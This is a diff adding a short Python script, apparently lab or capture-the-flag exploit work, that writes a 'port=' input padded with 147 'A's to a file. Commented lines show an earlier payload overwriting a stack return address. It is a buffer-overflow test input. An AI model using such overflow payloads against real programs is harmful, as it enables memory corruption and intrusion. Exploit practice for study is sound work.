@@ -1,0 +1,10 @@
+#!/usr/bin/env python
+from struct import *
+
+buf = "port="
+#buf += "C"*123
+#buf += pack("<Q", 0x00007fffffffcfa8)
+#buf += "C"*16
+buf += "A"*147
+f = open("check4.txt", "w")
+f.write(buf)
